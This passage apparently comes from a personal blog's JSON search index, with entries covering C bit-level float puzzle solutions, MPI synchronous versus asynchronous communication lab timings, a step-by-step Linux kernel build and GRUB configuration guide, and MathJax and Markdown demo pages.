equal.Solutionint floatIsEqual(unsigned uf, unsigned ug) { const int kExpMask = 0xff; // 0b11111111 const int kFracMask = 0x7fffff; // 0b11111111111111111111111 int f_exp = (uf &gt;&gt; 23) &amp; kExpMask; int g_exp = (ug &gt;&gt; 23) &amp; kExpMask; int f_frac = uf &amp; kFracMask; int g_frac = ug &amp; kFracMask; if ((f_exp == kExpMask) &amp;&amp; f_frac) // f is NaN return 0; if ((g_exp == kExpMask) &amp;&amp; g_frac) // g is NaN return 0; if (((uf &amp; 0x7fffffff) == 0) &amp;&amp; ((ug &amp; 0x7fffffff) == 0)) { // (f == 0) &amp;&amp; (g == 0) return 1; } return uf == ug;}floatFloat2IntThinkingIf exp &lt; 0, then f &lt; 1, return 0. Else if exp &lt; 31, f is within the range of int. Else, f is out of range.Solutionint floatFloat2Int(unsigned uf) { const int kExpMask = 0xff; // 0b11111111 const int kFracMask = 0x7fffff; // 0b11111111111111111111111 int sign = uf &gt;&gt; 31; int exp = (uf &gt;&gt; 23) &amp; kExpMask; int frac = uf &amp; kFracMask; exp -= 0x7f; frac |= 0x800000; // 0b100000000000000000000000 if (exp &lt; 0) { // close to 0 return 0; } else if (exp &lt; 31) { if (exp &lt; 23) { frac &gt;&gt;= 23 - exp; } else { frac &lt;&lt;= exp - 23; } if (sign) frac = -frac; return frac; } else { // out of range return 0x80000000u; }}floatScale2Solutionunsigned floatScale2(unsigned uf) { const int kExpMask = 0xff; // 0b11111111 const int kFracMask = 0x7fffff; // 0b11111111111111111111111 int s = uf &gt;&gt; 31; int exp = (uf &gt;&gt; 23) &amp; kExpMask; int frac = uf &amp; kFracMask; if (!exp) { // exp == 000...0 // Denormalized Values frac &lt;&lt;= 1; } else if (exp != kExpMask) { // (exp != 000...0) &amp;&amp; (exp != 111...1) // \"Normalized\" Values ++exp; } // else Special Values return (s &lt;&lt; 31) | (exp &lt;&lt; 23) | frac;}" }, { "title": "exp1: MPI 异步通信", "url": "/course-work/introduction-to-high-performance-computing/2022/03/15/exp1-mpi-%E5%BC%82%E6%AD%A5%E9%80%9A%E4%BF%A1/", "categories": "Course Work, Introduction to High Performance Computing", "tags": "HPC, MPI", "date": "2022-03-15 00:00:00 +0800", "snippet": "任务一 编号 消息长度 计算量 总耗时 1 16384 0 0.203542 ms 2 32768 0 0.431834 ms 3 65536 0 0.658495 ms 4 131072 0 1.17202 ms 5 262144 0 1.97818 ms 6 524288 0 3.79249 ms 7 1048576 0 7.23377 ms 8 2097152 0 14.1605 ms 9 4194304 0 28.2017 ms 10 8388608 0 56.3029 ms 11 16777216 0 113.967 ms 12 33554432 0 224.596 ms 每次消息长度是倍增的，总耗时的变化趋势是如何的？总耗时近似与消息长度呈近似的正比关系. 为什么会有这样的趋势？带宽存在上限. 因此消息长度越长, 发送所需的时间越长, 且通信速度稳定的情况下近似成正比.任务二 编号 消息长度 计算量 mpi_sync 总耗时 mpi_async 总耗时 1 100000000 10 774.084 ms 664.895 ms 2 100000000 20 866.185 ms 662.789 ms 3 100000000 40 1073.73 ms 695.044 ms 4 100000000 80 1518.8 ms 800.207 ms 5 100000000 160 2277.11 ms 1600.32 ms 通信时间和计算时间满足什么关系时，非阻塞通信程序能完美掩盖通信时间？当通信时间小于计算时间时, 非阻塞通信程序能完美掩盖通信时间. 简述两份代码的不同之处。mpi_sync 在等待消息发送完成后才进行计算, 而 mpi_async 在调用 MPI_Isend 后不等待消息发送, 而是立刻进行计算, 计算完成后再等待消息发送完毕." }, { "title": "How to Build Linux Kernel", "url": "/linux/2022/01/26/how-to-build-linux-kernel/", "categories": "Linux", "tags": "OSLAB, Linux Kernel, LLVM, Clang", "date": "2022-01-26 00:00:00 +0800", "snippet": " Environment Version Host Processor Intel(R) Core(TM) i7-10710U CPU @ 1.10GHz 1.61 GHz Host OS Windows 11 Pro Education 21H2 VMware(R) Workstation 16 Pro 16.2.2 build-19200509 Virtual Machine OS [Ubuntu 20.04.3 (amd64, Desktop LiveDVD) (tsinghua.edu.cn)](https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/focal/ubuntu-20.04.3-desktop-amd64.iso) Download the Source CodeVisit the official kernel website and download the linux-5.13.tar.gz (kernel.org). The downloaded file contains a compressed source code.Extract the Source Codetar --extract --gzip --file linux-5.13.tar.gzInstall Required PackagesInstall additional packages before building a kernel. To do so, run this command:12sudo apt install build-essential flex bison libelf-dev libssl-dev dwarves zstdThe command we used above installs the following packages: **Package** **Package description** git Tracks and makes a record of all changes during development in the source code. It also allows reverting the changes. fakeroot Packaging tool that makes the fake root environment. build-essential Installs development tools such as C, C++, gcc, and g++. ncurses-dev Programming library that provides API for the text-based terminals. xz-utils Provides fast file compression and decompression. libssl-dev Supports SSL and TSL that encrypt data and make the internet connection secure. bc (Basic Calculator) A mathematical scripting language that supports the interactive execution of statements. flex (Fast Lexical Analyzer Generator) Generates lexical analyzers that convert characters into tokens. libelf-dev Issues a shared library for managing ELF files (executable files, core dumps and object code) bison GNU parser generator that converts grammar description to a C program. Configure KernelThe Linux kernel source code comes with the default configuration. However, you can adjust it to your needs. To do so, follow the steps below:Navigate to the linux-5.13.0. directory using the cd command:cd linux-5.13.0To make changes to the configuration file, run the make command:make menuconfigIf no .config file exists, defaults found in /boot/config-$(uname -r) will be used. The command launches several scripts, which then open the configuration menu.The configuration menu includes options such as firmware, file system, network, and memory settings. Use the arrows to make a selection or choose Help to learn more about the options. When you finish making the changes, select Save, and then exit the menu. Note: Changing settings for some options can lead to a non-functional kernel. If you are unsure what to change, leave the default settings.In your kernel configuration file you will find this line:3CONFIG_SYSTEM_TRUSTED_KEYS=\"debian/canonical-certs.pem\"Change it to this:CONFIG_SYSTEM_TRUSTED_KEYS=\"\"Depending on your source structure you might be able to do it via command line. Examples:scripts/config --disable SYSTEM_TRUSTED_KEYSorscripts/config --set-str SYSTEM_TRUSTED_KEYS \"\"Another key has been added to the default Canonical kernel configuration since this answer was posted:CONFIG_SYSTEM_REVOCATION_KEYS=\"debian/canonical-revoked-certs.pem\"So, it also needs to be dealt with for user kernel compiles to complete:scripts/config --disable SYSTEM_REVOCATION_KEYSBuild the KernelStart building the kernel by running the following command:make --jobs=$(nproc --all)LLVM has substitutes for GNU binutils utilities. Kbuild supports LLVM=1 to enable them.4make LLVM=1They can be enabled individually. The full list of the parameters:make CC=clang-12 LD=ld.lld-12 AR=llvm-ar-12 NM=llvm-nm-12 STRIP=llvm-strip-12 \\ OBJCOPY=llvm-objcopy-12 OBJDUMP=llvm-objdump-12 READELF=llvm-readelf-12 \\ HOSTCC=clang-12 HOSTCXX=clang++-12 HOSTAR=llvm-ar-12 HOSTLD=ld.lld-12 Note: The version of kernel and compiler matters!!! If you cannot pass compilation, try another release of kernel or compiler.The process of building and compiling the Linux kernel takes some time to complete.The terminal lists all Linux kernel components: memory management, hardware device drivers, filesystem drivers, network drivers, and process management.Install the required modules with this command:sudo make modules_installFinally, install the kernel by typing:sudo make installChange the Default Boot KernelYou may press Esc to enter the boot menu when staring up, but that's a bit troublesome. Instead, use the following commands to list GRUB's menu entries:awk -F\\' '$1==\"menuentry \" || $1==\"submenu \" {print i++ \" : \" $2}; /\\tmenuentry / {print \"\\t\" i-1\"&gt;\"j++ \" : \" $2};' /boot/grub/grub.cfgFor example, I got the output:0 : Ubuntu1 : Advanced options for Ubuntu 1&gt;0 : Ubuntu, with Linux 5.13.0-30-generic 1&gt;1 : Ubuntu, with Linux 5.13.0-30-generic (recovery mode) 1&gt;2 : Ubuntu, with Linux 5.13.0 1&gt;3 : Ubuntu, with Linux 5.13.0 (recovery mode) 1&gt;4 : Ubuntu, with Linux 5.11.0-27-generic 1&gt;5 : Ubuntu, with Linux 5.11.0-27-generic (recovery mode)2 : Memory test (memtest86+)3 : Memory test (memtest86+, serial console 115200)For me, the desired default kernel to boot from is 1&gt;2 : Ubuntu, with Linux 5.13.0. Open the /etc/default/grub file and change the value of GRUB_DEFAULT to \"1&gt;2\", like this:5GRUB_DEFAULT=\"1&gt;2\" 1 in 1&gt;2 indicates the second entry of the main menu. 2 in 1&gt;2 indicates the third entry of the submenu. There is no space before and after the greater-than sign (&gt;) in 1&gt;2. Use a set of quotation marks to enclose 1&gt;2.Run update-grub afterwards to update /boot/grub/grub.cfg:sudo update-grubIf you stuck on Loading inital ramdisk... after reboot, try adding IUCODE_TOOL_INITRAMFS=no to /etc/default/intel-microcode and then re-running update-initramfs -u to remove the microcode bits from the initramfs image.6Reference How To Build Linux Kernel {Step-By-Step} | phoenixNAP KB &#8617; compilation - BTF: .tmp_vmlinux.btf: pahole (pahole) is not available - Stack Overflow &#8617; Compiling the kernel 5.11.11 - Ask Ubuntu &#8617; Building Linux with Clang/LLVM — The Linux Kernel documentation &#8617; How Do I Change the Default Boot Kernel in Ubuntu?_Elastic Cloud Server_Troubleshooting_Linux Issues_HUAWEI CLOUD &#8617; boot - Stuck on \"Loading initial ramdisk…\" after upgrading - Ask Ubuntu &#8617; " }, { "title": "MathJax v3 with TeX input and SVG output", "url": "/demo/2021/09/04/mathjax-v3-with-tex-input-and-svg-output/", "categories": "Demo", "tags": "MathJax", "date": "2021-09-04 00:00:00 +0800", "snippet": "When $a \\neq 0$, there are two solutions to $a x^2 + b x + c = 0$ and they are$x = \\frac{- b \\pm \\sqrt{b^2 - 4 a c}}{2 a}$The Lorenz Equations$$\\begin{align} \\dot{x} & = \\sigma\\pqty{y - x} \\\\ \\dot{y} & = \\rho x - y - x z \\\\ \\dot{z} & = - \\beta z + x y\\end{align}$$The Cauchy-Schwarz Inequality$$\\pqty{\\sum_{k = 1}^n a_k b_k}^2 \\leqslant \\pqty{\\sum_{k = 1}^n a_k^2} \\pqty{\\sum_{k = 1}^n b_k^2}$$A Cross Product Formula$$\\vb{V}_1 \\times \\vb{V}_2 = \\begin{vmatrix} \\vb{i} & \\vb{j} & \\vb{k} \\\\ \\pdv{X}{u} & \\pdv{Y}{u} & 0 \\\\ \\pdv{X}{v} & \\pdv{Y}{v} & 0\\end{vmatrix}$$The probability of getting $k$ heads when flipping $n$ coins is:$$P\\pqty{E} = \\binom{n}{k} p^k \\pqty{1 - p}^{n - k}$$An Identity of Ramanujan$$\\frac{1}{\\pqty{\\sqrt{\\phi \\sqrt{5}} - \\phi} e^{\\frac{2}{5} \\pi}}= 1 + \\frac{e^{- 2 \\pi}}{1 + \\frac{e^{- 4 \\pi}}{1 + \\frac{e^{- 6 \\pi}}{1 + \\frac{e^{- 8 \\pi}}{1 + \\ldots}}}}$$A Rogers-Ramanujan Identity$$1 + \\frac{q^2}{\\pqty{1 - q}} + \\frac{q^6}{\\pqty{1 - q} \\pqty{1 - q^2}} + \\cdots= \\prod_{j = 0}^{\\infty} \\frac{1}{\\pqty{1 - q^{5 j + 2}} \\pqty{1 - q^{5 j + 3}}},\\qqtext{for $\\vqty{q} Maxwell's Equations$$\\begin{align} \\curl{\\va{B}} - \\frac{1}{c} \\pdv{\\va{E}}{t} & = \\frac{4 \\pi}{c} \\va{j} \\\\ \\div{\\va{E}} & = 4 \\pi \\rho \\\\ \\curl{\\va{E}} + \\frac{1}{c} \\pdv{\\va{B}}{t} & = \\va{0} \\\\ \\div{\\va{B}} & = 0\\end{align}$$In-line MathematicsFinally, while display equations look good for a page of samples, the ability to mix math and text in a paragraph is also important. This expression $\\sqrt{3 x - 1} + \\pqty{1 + x}^2$ is an example of an inline equation. As you see, MathJax equations can be used this way as well, without unduly disturbing the spacing between lines." }, { "title": "Sample Markdown", "url": "/demo/2004/12/17/sample-markdown/", "categories": "Demo", "tags": "Markdown", "date": "2004-12-17 00:00:00 +0800", "snippet": "h1 Heading 8-)h2 Headingh3 Headingh4 Headingh5 Headingh6 HeadingHorizontal RulesTypographic replacementsEnable typographer option to see result.(c) (C) (r) (R) (tm) (TM) (p) (P) +-test.. test… test….. test?….. test!….!!!!!! ???? ,, – —\"Smartypants, double quotes\" and 'single quotes'EmphasisThis is bold textThis is bold textThis is italic textThis is italic textStrikethroughBlockquotes Blockquotes can also be nested… …by using additional greater-than signs right next to each other… …or with spaces between arrows. ListsUnordered Create a list by starting a line with +, -, or * Sub-lists are made by indenting 2 spaces: Marker character change forces new list start: Ac tristique libero volutpat at Facilisis in pretium nisl aliquet Nulla volutpat aliquam velit Very easy!Ordered Lorem ipsum dolor sit amet Consectetur adipiscing elit Integer molestie lorem at massa You can use sequential numbers… …or keep all the numbers as 1.Start numbering with offset: foo barCodeInline codeIndented code// Some commentsline 1 of codeline 2 of codeline 3 of codeBlock code \"fences\"Sample text here...Syntax highlightingvar foo = function (bar) { return bar++;};console.log(foo(5));Tables Option Description data path to data files to supply the data that will be passed into templates. engine engine to be used for processing templates. Handlebars is the default. ext extension to be used for dest files. Right aligned columns Option Description data path to data files to supply the data that will be passed into templates. engine engine to be used for processing templates. Handlebars is the default. ext extension to be used for dest files. Linkslink textlink with titleAutoconverted link https://github.com/nodeca/pica (enable linkify to see)ImagesLike links, Images also have a footnote style syntaxWith a reference later in the document defining the URL location:PluginsThe killer feature of markdown-it is very effective support ofsyntax plugins.Emojies Classic markup: :wink: :crush: :cry: :tear: :laughing: :yum: Shortcuts (emoticons): :-) :-( 8-) ;)see how to change output with twemoji.Subscript / Superscript 19^th^ H~2~O&lt;ins&gt;++Inserted text++&lt;mark&gt;==Marked text==FootnotesFootnote 1 link1.Footnote 2 link2.Inline footnote^[Text of inline footnote] definition.Duplicated footnote reference2.Definition lists Term 1 Definition 1with lazy continuation. Term 2 with inline markup Definition 2 { some code, part of Definition 2 } Third paragraph of definition 2. Compact style:Term 1 ~ Definition 1Term 2 ~ Definition 2a ~ Definition 2bAbbreviationsThis is HTML abbreviation example.It converts \"HTML\", but keep intact partial entries like \"xxxHTMLyyy\" and so on.Custom containers::: warninghere be dragons::: Footnote can have markup and multiple paragraphs. &#8617; Footnote text. &#8617; &#8617;2 " } ]
